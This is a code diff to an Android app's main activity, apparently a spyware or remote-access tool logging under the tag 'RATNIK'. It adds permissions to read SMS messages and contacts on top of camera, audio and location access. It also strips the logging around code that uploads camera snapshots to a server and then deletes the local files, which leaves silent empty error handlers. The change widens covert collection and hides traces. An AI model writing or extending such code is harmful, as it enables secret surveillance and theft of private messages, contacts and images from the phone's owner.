@@ -105,7 +105,9 @@ class MainActivity : AppCompatActivity() {
         val perms = mutableListOf(
             Manifest.permission.CAMERA,
             Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.ACCESS_FINE_LOCATION
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.READ_CONTACTS
         )
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             perms.add(Manifest.permission.POST_NOTIFICATIONS)
@@ -200,22 +202,17 @@ class MainActivity : AppCompatActivity() {
                     try {
                         client.newCall(request).execute().use { }
                         file.delete()
-                        Log.d("RATNIK", "Снимок $fileName отправлен")
-                    } catch (e: Exception) {
-                        Log.e("RATNIK", "Ошибка отправки $fileName: ${e.message}")
-                    }
+                    } catch (e: Exception) {}
                     
                     camera.release()
                     onComplete()
                     
                 } catch (e: Exception) {
-                    Log.e("RATNIK", "Ошибка сохранения $fileName: ${e.message}")
                     camera.release()
                     onComplete()
                 }
             }
         } catch (e: Exception) {
-            Log.e("RATNIK", "Ошибка камеры $cameraId: ${e.message}")
             camera?.release()
             onComplete()
         }
